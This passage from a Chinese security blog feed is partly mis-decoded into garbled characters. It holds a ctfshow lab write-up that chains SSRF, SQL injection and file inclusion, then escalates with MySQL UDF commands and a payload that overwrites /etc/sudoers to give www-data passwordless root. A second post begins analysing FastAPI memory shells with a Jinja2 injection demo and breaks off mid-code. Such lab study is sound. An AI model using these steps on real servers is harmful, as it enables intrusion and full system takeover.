class="string">&#x27;/^[A-Za-z]+$/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ¨ä¸ªå»æ‰“å³å¯ï¼</p><p>è®°ç‚¹ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span>content = call<span class="built_in">_</span>user<span class="built_in">_</span>func(<span class="built_in">$</span>m);</span><br><span class="line">if(stripos(<span class="built_in">$</span>content, <span class="built_in">$</span>key)!==FALSE)&#123;</span><br><span class="line">echo shell<span class="built_in">_</span>exec(&#x27;cat /FLAG/FLAG647&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªæ‰“æ³•ï¼šgetenvå’Œsession_idï¼ˆè·å–å½“å‰çš„PHPSESSIDï¼‰</p><p>ä¸‹ä¸ªç¯èŠ‚ï¼</p><h3 id="page-php"><a href="#page-php" class="headerlink" title="&#x2F;page.php"></a>&#x2F;page.php</h3><p>åˆ©ç”¨ssrfæ‹¿æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-07-25 16:22:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-07-25 16:22:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="keyword">__DIR__</span>.DIRECTORY_SEPARATOR.<span class="string">&#x27;system36d/util/dbutil.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]:<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è½¬æ¢&#x27; &quot; \ æ¥å®ç°é˜²æ³¨å…¥</span></span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = db::<span class="title function_ invoke__">get_username</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç‰µæ‰¯åˆ°&#x2F;system36&#x2F;util&#x2F;deutil.phpç»§ç»­æ‹¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$username</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$password</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$database</span> = <span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select `key` from ctfshow_keys&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$res</span>) &#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_username</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select `username` from ctfshow_users where id = (<span class="subst">$id</span>)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$res</span>) &#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_conn</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$conn</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="built_in">self</span>::<span class="variable">$host</span>, <span class="built_in">self</span>::<span class="variable">$username</span>, <span class="built_in">self</span>::<span class="variable">$password</span>, <span class="built_in">self</span>::<span class="variable">$database</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$conn</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$conn</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªsqlæ³¨å…¥é—­åˆæ‹¬å·å°±å¯ä»¥æ‰“æ­£å¸¸æ³¨å…¥æ‹¿åˆ°keyå³å¯ï¼</p><p>ä¹‹å‰ä»¥ä¸º&#x2F;system36d&#x2F;util&#x2F; 403ä¸‹é¢çš„æ–‡ä»¶ä¹Ÿæ˜¯403ï¼Œç°åœ¨çœ‹æ¥å¹¶éï¼Œæ‰€ä»¥ç›´æ¥æ‰«å‡ºä¸ªcommon.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;dbutil.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// éªŒè¯ GET å‚æ•° k æ˜¯å¦ç­‰äº FLAG651 çš„å†…å®¹</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>] !== <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /FLAG/FLAG651&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;651flagæœªæ‹¿åˆ°&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// éªŒè¯ POST å‚æ•°å­˜åœ¨ä¸”æ–‡ä»¶å­˜åœ¨ï¼ŒåŒæ—¶éªŒè¯ key ä¸æ•°æ®åº“ä¸­çš„ key ä¸€è‡´</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (db::<span class="title function_ invoke__">get_key</span>() == <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="keyword">__DIR__</span> . DIRECTORY_SEPARATOR . <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„å£å­ï¼Œç”¨æ¥åŒ…å«æˆ‘ä»¬çš„é©¬å§</p><p>æ³•ä¸€ï¼šsessionåŒ…å«ï¼Œphpinfoé‡Œé¢çœ‹äº†ä¸‹é…ç½®é¡¹å¼€äº†ï¼Œç›´æ¥å†™</p><p>æ³•äºŒï¼šä¹‹å‰init.phpé‡Œé¢çŸ¥é“äº†å¤‡ä»½æ–‡ä»¶çš„è·¯å¾„ï¼Œæˆ‘ä»¬åˆ©ç”¨æ¢å¤åŠŸèƒ½å¯ä»¥æ‰“</p><h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><p>æœ‰é©¬äº†ï¼Œç”¨èšå‰‘é“¾æ¥å‘—ï¼ä½†æ˜¯æƒé™å¤ªä½äº†ï¼Œææƒå’¯ï¼Œsuidä¸‹é¢æœ‰ä¸€ä¸ªä½†æ˜¯ç”¨ä¸äº†ï¼Œä¸çŸ¥é“ä¸ºå•¥å¯èƒ½å’Œäº¤äº’æœ‰å…³å§ï¼è¿™é‡ŒçŸ¥é“æ•°æ®åº“å¯†ç æˆ‘ä»¬ç”¨udfææƒï¼(å…·ä½“æ€ä¹ˆæå¯ä»¥é—®æˆ‘)</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">#</span>ç”±äºæ•°æ®åº“é™åˆ¶äº†æ–‡ä»¶æ“ä½œçš„ç›®å½•ï¼Œæ‰€ä»¥åªèƒ½é…åˆcpå‘½ä»¤è¿›è¡Œæ“ä½œç›®å½•äº†</span><br><span class="line"><span class="params">#</span>å…ˆå†™ä¸€ä¸ªæ¶æ„çš„soåŠ¨æ€é“¾æ¥æ–‡ä»¶</span><br><span class="line"><span class="params">#</span>ç„¶åcpç§»åŠ¨åˆ°æ’ä»¶ç›®å½•/udf.so</span><br><span class="line"><span class="params">#</span>åˆ›å»ºæ¶æ„å‡½æ•°</span><br><span class="line">create function sys<span class="built_in">_</span>eval returns string soname &#x27;udf.so&#x27;;</span><br><span class="line"><span class="params">#</span> çœ‹çœ‹æˆåŠŸæ²¡</span><br><span class="line">select * from mysql.func where name = &#x27;sys<span class="built_in">_</span>eval&#x27;;</span><br><span class="line"><span class="params">#</span> æ‰§è¡Œå‘½ä»¤</span><br><span class="line">select sys<span class="built_in">_</span>eval(&#x27;sudo ls /root&#x27;);</span><br><span class="line">select sys<span class="built_in">_</span>eval(&#x27;sudo cat /root/you<span class="built_in">_</span>win&#x27;);</span><br><span class="line"></span><br><span class="line">ç¥è´ºä½ ï¼Œä½ å·²ç»å®Œå…¨æ§åˆ¶äº†è¿™å°æœåŠ¡å™¨ï¼Œä¸ºä½ ä¸€è·¯ä»¥æ¥çš„åšæŒå’ŒåŠªåŠ›ï¼Œç‚¹èµï¼</span><br><span class="line"></span><br><span class="line">                  çœŸä¸å®¹æ˜“å•Šï¼Œå¸ˆå‚…å¥½æ ·çš„ï¼</span><br><span class="line"></span><br><span class="line">ä¸è¿‡åˆ«é«˜å…´çš„å¤ªæ—©ï¼Œè¿™åªæ˜¯ç¬¬ä¸€å…³ï¼Œåé¢è¿˜æœ‰æ›´è‰°éš¾çš„æŒ‘æˆ˜ï¼Œä½ å‡†å¤‡å¥½äº†å—ï¼</span><br><span class="line"></span><br><span class="line">å¯¹äº†ï¼Œè¿™æ˜¯ç»™ä½ çš„flag </span><br><span class="line"></span><br><span class="line">flag<span class="built_in">_</span>654=ctfshow&#123;4ab2c2ccd0c3c35fdba418d8502f5da9&#125; </span><br><span class="line"></span><br><span class="line">                                   â€”â€”å¤§èœé¸¡ 2021å¹´8æœˆ2æ—¥02æ—¶12ï¿½</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›´æ¥æˆåŠŸï¼ç°åœ¨æ˜¯ææƒæˆåŠŸäº†ï¼Œä¸ºäº†æ“ä½œæ–¹ä¾¿æˆ‘ä»¬è¿˜æ˜¯æƒ³åœ¨èšå‰‘çš„è™šæ‹Ÿç»ˆç«¯å»æ‰§è¡Œå‘½ä»¤è€Œä¸æ˜¯ç”¨sqlè¯­å¥å»æ‰§è¡Œï¼ä¸€å¼€å§‹æˆ‘çš„æƒ³æ³•ç›´æ¥æ”¹å¯†ç ä¸å°±è¡Œäº†ï¼Œä½†æ˜¯èšå‰‘çš„è™šæ‹Ÿç»ˆç«¯ä¸æ˜¯é¢˜ç›®çš„shellå•Šï¼Œæ²¡æœ‰äº¤äº’å¼ï¼Œå³ä½¿æ”¹äº†å¯†ç ä¹Ÿæ²¡æ³•è¾“å…¥ï¼é‚£ä¹ˆè¿™é‡Œæœ‰å¦å¤–çš„åŠæ³•å°±æ˜¯ç»™www-dataè¿™ä¸ªç”¨æˆ·ä¹Ÿæ·»åŠ ä¸Šsudoï¼</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ä¸è¦å»æ”¹&#x2F;etc&#x2F;sudoersè¿™ä¸ªæ–‡ä»¶çš„æƒé™ï¼Œè¿™ä¸ªæ–‡ä»¶çš„æƒé™å¦‚æœè¿‡äºå®½æ¾çš„è¯å°±ä¼šæ‹’ç»æ‰€æœ‰çš„sudoå‘½ä»¤ï¼Œmysqlçš„ä¹Ÿä¸è¡Œäº†ï¼Œå°±åªèƒ½é‡å¼€é¶æœºå†æ‰“äº†ï¼æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨cpå»è¿›è¡Œæ–‡ä»¶çš„ç§»åŠ¨ï¼</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨å‰é¢çš„æ–‡ä»¶åŒ…å«å†™å…¥</span><br><span class="line">&lt;?php file<span class="built_in">_</span>put<span class="built_in">_</span>contents(&#x27;sudoers&#x27;,&#x27;root ALL=(ALL) ALL</span><br><span class="line">@includedir /etc/sudoers.d</span><br><span class="line">mysql ALL=(ALL:ALL) NOPASSWD:ALL</span><br><span class="line">www-data ALL=(ALL:ALL) NOPASSWD:ALL&#x27;);?&gt;</span><br><span class="line">ç§»åŠ¨</span><br><span class="line">select sys<span class="built_in">_</span>eval(&#x27;sudo cp /var/www/html/system36d/util/sudoers /etc/sudoers&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/images/achieve/2025/11/12.png"></p><h2 id="å†…ç½‘æ¨ªå‘"><a href="#å†…ç½‘æ¨ªå‘" class="headerlink" title="å†…ç½‘æ¨ªå‘"></a>å†…ç½‘æ¨ªå‘</h2><p><del>æ²¡å¤ªäº†è§£ä¸æ˜¯å¾ˆä¼šæ¬ ç€</del></p>]]></content>
      
      
      <categories>
          
          <category> ctfshowé¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
            <tag> udfææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FastAPIä¸‹çš„å†…å­˜é©¬ï¼ˆæœªå®Œï¼‰</title>
      <link href="/2025/11/03/FastAPI%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2025/11/03/FastAPI%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>å‰ä¸¤å¤©baoå¸ˆå‚…å‡ºäº†fastapiçš„å†…å­˜é©¬ï¼Œç”±äºè‡ªå·±å­¦è¿‡flaskçš„å†…å­˜é©¬ï¼Œæ‰€ä»¥å‚è€ƒäº†ä¸€ç¯‡æ–‡ç« å¾ˆå¿«å°±æ‰“é€šäº†ï¼ä¸€å¼€å§‹æƒ³ç€åŸç†åº”è¯¥éƒ½å·®ä¸å¤šå§ï¼Œä½†æ˜¯è½¬å¿µä¸€æƒ³é‡è¦çš„åº”è¯¥æ˜¯åˆ†æä»£ç å’Œæ¢ç´¢çš„èƒ½åŠ›ï¼è‡ªå·±è¿™æ–¹é¢çš„èƒ½åŠ›æ¯”è¾ƒå¼±ï¼Œæ‰€ä»¥æ‰“ç®—å†™ç¯‡æ–‡ç« å­¦ä¹ ä¸€ä¸‹ï¼ˆä¸èƒ½é€ƒé¿ï¼‰ï¼</p><h2 id="fastapi-demo"><a href="#fastapi-demo" class="headerlink" title="fastapi demo"></a>fastapi demo</h2><p>fastapiå…¶å®å°±æ˜¯pythonçš„ä¸€ä¸ªæ¡†æ¶ï¼ŒåŠŸèƒ½ç±»ä¼¼äºæ˜¯flaskï¼Œéƒ½æ˜¯ç”¨æ¥åˆ›å»ºwebåº”ç”¨çš„ï¼</p><p>ä¸€ä¸ªç®€å•çš„demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> HTMLResponse</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line">Jinja2 = Environment()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hello World&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/hack&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">hack</span>(<span class="params">username=<span class="string">&quot;Guest&quot;</span></span>):</span><br><span class="line">    output = Jinja2.from_string(<span class="string">&quot;Welcome &quot;</span> + username).render()</span><br><span class="line">    <span class="keyword">return</span> HTMLResponse(content=output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> uvicorn</span><br><span class="line">    uvicorn.run(app, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>appæ˜¯FastAPIåº”ç”¨å®ä¾‹ï¼Œæ˜¯æ•´ä¸ªwebåº”ç”¨çš„æ ¸å¿ƒï¼ä½ å¯ä»¥ç®€å•åœ°ç†è§£æˆCPUï¼Œæ‰€ä»¥åé¢æˆ‘ä»¬åé¢æˆ‘ä»¬å»è°ƒç”¨FastAPIçš„ä¸€äº›æ–¹æ³•å•¥çš„éƒ½æ˜¯å…ˆå»æ‰¾å®ƒï¼</p><h2 id="ç»å…¸è·¯çº¿ï¼šè·¯ç”±æ·»åŠ å‡½æ•°"><a href="#ç»å…¸è·¯çº¿ï¼šè·¯ç”±æ·»åŠ å‡½æ•°" class="headerlink" title="ç»å…¸è·¯çº¿ï¼šè·¯ç”±æ·»åŠ å‡½æ•°"></a>ç»å…¸è·¯çº¿ï¼šè·¯ç”±æ·»åŠ å‡½æ•°</h2><p>è·Ÿè¿›è¿‡ç¨‹å‡ºäº†ç‚¹å°æ’æ›²ï¼Œå¥½åœ¨baoå‘Šè¯‰æˆ‘åŠ¨æ€è·Ÿè¿›ï¼èŠ±äº†25å¤§æ´‹ä¸å»ä¸Šè¯¾æ•´å‡ºæ¥çš„ï¼</p><p>é¦–å…ˆæ˜é¢ä¸Šä»£ç é‡Œé¢æ˜¯é€šè¿‡<code>get(&quot;/hack&quot;)</code>è¿™æ ·çš„å½¢å¼å»æ·»åŠ è·¯ç”±çš„ï¼Œä½†åº•å±‚å°±å¦‚æ­¤å—ï¼Ÿæˆ‘ä»¬è·Ÿè¿›<code>get</code></p><p><img src="/images/achieve/2025/11/7.png"></p><p>ç»§ç»­è·Ÿè¿›<code>router</code></p><p><img src="/images/achieve/2025/11/8.png"></p><p>ç»§ç»­è·Ÿè¿›çš„æ—¶å€™å¹¶æ²¡æœ‰å‘ç°<code>get</code>å‡½æ•°çš„å®šä¹‰ï¼ŒçœŸå¥‡æ€ªï¼é™æ€è·Ÿè¿›è€æ˜¯ç›´æ¥åˆ°å®ƒçˆ¶ç±»é‡Œé¢å»äº†ï¼é‚£å°±åŠ¨æ€è·Ÿè¿›å§</p><p><img src="/images/achieve/2025/11/9.png"></p><p>æ‰“å¥½æ–­ç‚¹è°ƒè¯•å‘ç°</p><p><code>self.router.get</code>è¿™ä¸ªè°ƒç”¨æ˜¯<code>APIRouter</code>è¿™ä¸ªç±»çš„getæ–¹æ³•ï¼Œæœ€ååˆè°ƒç”¨äº†<code>api_route</code>ç»§ç»­è·Ÿè¿›</p><p><img src="/images/achieve/2025/11/10.png"></p><p>è¿™é‡Œé—­åŒ…äº†è¿”å›çš„æ˜¯è¢«è£…é¥°äº†çš„å‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›<code>add_api_route</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_api_route</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    path: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    endpoint: <span class="type">Callable</span>[..., <span class="type">Any</span>],</span></span><br><span class="line"><span class="params">    *,</span></span><br><span class="line"><span class="params">    response_model: <span class="type">Any</span> = Default(<span class="params"><span class="literal">None</span></span>),</span></span><br><span class="line"><span class="params">    status_code: <span class="type">Optional</span>[<span class="built_in">int</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    tags: 